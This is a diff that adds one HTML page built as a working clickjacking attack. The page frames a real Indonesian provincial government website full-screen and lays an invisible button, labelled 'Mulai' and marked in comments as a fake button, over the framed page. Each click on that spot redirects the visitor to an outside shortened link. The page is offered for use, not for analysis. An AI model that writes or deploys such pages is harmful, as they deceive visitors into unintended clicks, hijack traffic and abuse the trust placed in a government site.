@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>https://bahubdaconnection.sulselprov.go.id</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+      }
+
+      .iframe-container {
+        position: relative;
+        width: 100%;
+        height: 100vh;
+        opacity: 1;
+        overflow: hidden;
+        left: 0;
+        top: 0;
+        bottom: 0;
+        right: 0;
+        margin: 0;
+      }
+
+      iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 1;
+        /* Membuat iframe hampir tidak terlihat */
+        z-index: 1;
+      }
+
+      .fake-button {
+        position: absolute;
+        right: 131px;
+        top: 17px;
+        z-index: 9999999999999;
+        background-color: #007bff;
+        color: white;
+        padding: 8.6px 23px;
+        border-radius: 20px;
+        font-size: 18px;
+        cursor: pointer;
+        opacity: 0;
+      }
+
+      .fake-button:hover {
+        cursor: pointer;
+        background-color: red;
+      }
+
+      h1 {
+        text-transform: uppercase;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="iframe-container">
+      <!-- Tombol Palsu -->
+      <div class="fake-button" id="btn-fake">Mulai</div>
+      <!-- Iframe untuk memuat halaman target -->
+      <iframe src="https://bahubdaconnection.sulselprov.go.id/" frameborder="0"></iframe>
+      <script>
+        const btn = document.getElementById("btn-fake");
+        btn.addEventListener("click", () => {
+          window.location.href = "https://id.shp.ee/NX9em16 ";
+        });
+      </script>
+    </div>
+  </body>
+</html>
